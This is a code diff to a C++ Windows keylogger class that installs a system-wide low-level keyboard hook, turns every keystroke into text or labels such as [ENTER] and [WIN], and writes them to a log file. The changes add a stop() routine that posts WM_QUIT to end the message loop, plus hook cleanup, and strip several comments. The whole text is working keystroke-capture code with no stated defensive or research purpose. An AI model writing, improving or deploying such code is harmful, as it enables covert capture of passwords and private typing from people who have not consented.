@@ -3,6 +3,8 @@
 std::ofstream KeyLogger::outFile;
 HHOOK KeyLogger::hook = nullptr;
 std::string KeyLogger::filePath;
+bool KeyLogger::running = true;
+DWORD KeyLogger::threadId = 0;
 
 KeyLogger::KeyLogger(const std::string& filename) {
     filePath = filename;
@@ -15,23 +17,37 @@ void KeyLogger::start() {
     hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, nullptr, 0);
     if (!hook) return;
 
+    running = true;
+    threadId = GetCurrentThreadId();  // Save the current thread ID for WM_QUIT
+
     MSG msg;
-    while (GetMessage(&msg, nullptr, 0, 0)) {
+    while (running && GetMessage(&msg, nullptr, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
 
-    UnhookWindowsHookEx(hook);
+    if (hook) {
+        UnhookWindowsHookEx(hook);
+        hook = nullptr;
+    }
+
     outFile.close();
 }
 
+void KeyLogger::stop() {
+    running = false;
+
+    // Post WM_QUIT to force GetMessage() to break
+    if (threadId != 0) {
+        PostThreadMessage(threadId, WM_QUIT, 0, 0);
+    }
+}
+
 LRESULT CALLBACK KeyLogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    // Only process real key down events
     if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
         KBDLLHOOKSTRUCT* kbStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
         DWORD vkCode = kbStruct->vkCode;
 
-        // Get current keyboard state (shift, caps, etc.)
         BYTE keyboardState[256];
         GetKeyboardState(keyboardState);
 
@@ -39,10 +55,8 @@ LRESULT CALLBACK KeyLogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam
         UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
         HKL layout = GetKeyboardLayout(0);
 
-        // Try to convert virtual key into Unicode character
         int result = ToUnicodeEx(vkCode, scanCode, keyboardState, buffer, 4, 0, layout);
         if (result > 0) {
-            // Convert WCHAR to UTF-8 properly (supports accents)
             char utf8Char[5] = {0};
             int len = WideCharToMultiByte(CP_UTF8, 0, buffer, 1, utf8Char, sizeof(utf8Char), nullptr, nullptr);
             if (len > 0) {
@@ -50,7 +64,6 @@ LRESULT CALLBACK KeyLogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam
                 outFile.flush();
             }
         } else {
-            // Handle non-character keys manually
             switch (vkCode) {
                 case VK_RETURN:    outFile << "[ENTER]"; break;
                 case VK_BACK:      outFile << '\b' << "[BACK]"; break;
@@ -72,7 +85,7 @@ LRESULT CALLBACK KeyLogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam
                 case VK_LWIN:
                 case VK_RWIN:      outFile << "[WIN]"; break;
 
-                // Navigation
+                // Arrows & navigation
                 case VK_LEFT:      outFile << "[LEFT]"; break;
                 case VK_RIGHT:     outFile << "[RIGHT]"; break;
                 case VK_UP:        outFile << "[UP]"; break;
@@ -84,7 +97,7 @@ LRESULT CALLBACK KeyLogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam
                 case VK_PRIOR:     outFile << "[PAGEUP]"; break;
                 case VK_NEXT:      outFile << "[PAGEDOWN]"; break;
 
-                // Lock keys
+                // Locks & others
                 case VK_NUMLOCK:   outFile << "[NUMLOCK]"; break;
                 case VK_SCROLL:    outFile << "[SCROLLLOCK]"; break;
                 case VK_SNAPSHOT:  outFile << "[PRTSC]"; break;
@@ -104,16 +117,13 @@ LRESULT CALLBACK KeyLogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam
                 case VK_F11: outFile << "[F11]"; break;
                 case VK_F12: outFile << "[F12]"; break;
 
-                // Optional: capture unknown keys
                 default:
-                    outFile << "[UNK:" << vkCode << "]";
-                    break;
+                    outFile << "[UNK:" << vkCode << "]"; break;
             }
 
             outFile.flush();
         }
     }
 
-    // Pass the event to next hook in the chain
     return CallNextHookEx(nullptr, nCode, wParam, lParam);
 }
